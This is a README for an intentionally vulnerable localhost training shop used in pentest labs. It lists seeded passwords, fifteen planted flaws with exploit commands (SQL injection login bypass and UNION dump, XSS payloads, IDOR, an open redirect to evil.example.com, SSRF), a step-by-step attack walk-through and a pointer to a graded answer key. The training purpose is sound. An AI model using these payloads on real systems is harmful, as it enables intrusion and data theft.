# Lab 01 — VulnShop

> ⚠️ **INTENTIONALLY VULNERABLE — LOCALHOST TRAINING ONLY.**
> This app plants real, exploitable bugs on purpose. Never expose it to a
> network, never run it on a public/shared host, and never reuse any of the
> seed credentials. It binds to `127.0.0.1` for a reason.

## What it is

**VulnShop** is a fake e-commerce site ("the store at the end of the universe")
used to practice the full pentest flow: content discovery / recon → passive
header audit → active exploitation. It is a **single self-contained Python
file** using only the standard library (`http.server` + `sqlite3` + `urllib`) —
no Flask, no pip installs. The data lives in an in-memory SQLite DB seeded at
startup (`users`, `products`, `orders`, `comments`).

The home page links to the main pages so a crawler / content-discovery tool
finds them, and `/robots.txt` leaks a `/secret-admin` breadcrumb.

## How to run

```bash
python app.py
```

Then browse to **http://127.0.0.1:18801**. Stop with `Ctrl+C`.
No arguments, no config, no dependencies. Requires Python 3.8+.

## Seeded credentials (for reference)

| username | password           | role     |
|----------|--------------------|----------|
| admin    | `S3cr3tAdminP@ss`  | admin    |
| alice    | `alice123`         | customer |
| bob      | `bobpassword`      | customer |
| carol    | `letmein2024`      | customer |

(You shouldn't *need* these — the point is to break in without them.)

## Planted vulnerabilities

Answer key: [`gabarito.json`](gabarito.json). Each vuln is worth 1 point.

### Recon stage (discoverable by a crawler + passive header audit)

| ID  | Class        | Sev      | Route             | How to exploit |
|-----|--------------|----------|-------------------|----------------|
| V01 | scm          | high     | `/.git/config`    | `git-dumper http://127.0.0.1:18801/.git/ loot` or `curl /.git/config` (also `/.git/HEAD`). |
| V02 | creds        | critical | `/.env`           | `curl /.env` → `DB_PASSWORD`, `SECRET_KEY`, `STRIPE_KEY=sk_live_...`, `JWT_SECRET`. |
| V03 | backup       | high     | `/backup.sql`     | `curl /backup.sql` → SQL dump with plaintext user passwords + legacy hashes. |
| V04 | dir-listing  | medium   | `/uploads/`       | `curl /uploads/` → Apache-style "Index of /uploads" listing `db_dump.sql`, invoices, `users_export.csv`. |
| V05 | headers      | low      | `/` (all)         | `curl -I /` → no `X-Frame-Options` / `CSP` / `X-Content-Type-Options` / `HSTS` (clickjacking + header audit). |
| V06 | cookie       | medium   | `/login`          | Successful login sets `session=...` cookie with **no** `HttpOnly` / `Secure` / `SameSite`. |
| V07 | info-disc    | medium   | `/product?id=abc` | Any unhandled error / bad input returns a full Python traceback or raw SQL error in the body. |
| V08 | admin-panel  | high     | `/admin`          | `curl /admin` → user list, no auth. Breadcrumb: `/robots.txt` → `/secret-admin`. |

### Exploitation stage (active)

| ID  | Class         | Sev      | Route             | How to exploit |
|-----|---------------|----------|-------------------|----------------|
| V09 | sqli          | critical | `/login` (POST)   | `curl -i -d "username=' OR '1'='1' -- &password=x" /login` → **302** `/dashboard` + `Set-Cookie`. |
| V10 | sqli          | high     | `/product?id=1`   | `id=1 AND 1=2` → empty; `id=1'` → verbose sqlite error. UNION-injectable (`id=0 UNION SELECT 1,username,3,password FROM users`). |
| V11 | xss           | medium   | `/search?q=`      | `curl '/search?q=<script>alert(1)</script>'` → reflected unencoded. |
| V12 | stored-xss    | high     | `/comment` (POST) | POST a comment with `<script>...</script>` body; it persists and fires for every visitor of `/comments`. |
| V13 | idor          | high     | `/api/order?id=1` | Iterate `id=1..5` (also `/api/order/<id>`) → any user's order, no ownership check. |
| V14 | open-redirect | low      | `/redirect?url=`  | `curl -i '/redirect?url=https://evil.example.com'` → 302 to attacker URL. |
| V15 | ssrf          | high     | `/fetch?url=`     | `curl '/fetch?url=http://127.0.0.1:18801/.env'` → server fetches the URL and returns the body (http/https only). |

## Suggested attack walk-through

1. **Recon:** crawl `/`, read `/robots.txt`, grab `/.git/config`, `/.env`,
   `/backup.sql`, list `/uploads/`. Passive audit `curl -I /` for missing
   headers. You now have creds and source-control intel.
2. **Auth bypass:** `' OR '1'='1' -- ` into `/login` → dashboard + insecure
   cookie (V06).
3. **Data exfil:** UNION-based SQLi on `/product?id=` (V10) to dump `users`;
   IDOR on `/api/order` (V13) to read every order.
4. **Client-side:** reflected XSS on `/search` (V11), stored XSS on
   `/comments` (V12).
5. **Server-side reach:** SSRF on `/fetch` (V15) to pull internal resources;
   open redirect on `/redirect` (V14) for phishing chains.

## Notes / design

- In-memory SQLite, seeded fresh every start — restart to reset state
  (e.g., after planting stored-XSS comments).
- The server is threaded and wraps handlers so it **never crashes** — except
  the *intentional* verbose-traceback path (V07), which is the bug.
- `Server:` header is faked as `Apache/2.4.41 (Ubuntu)` to make the
  Apache-style directory listing believable.
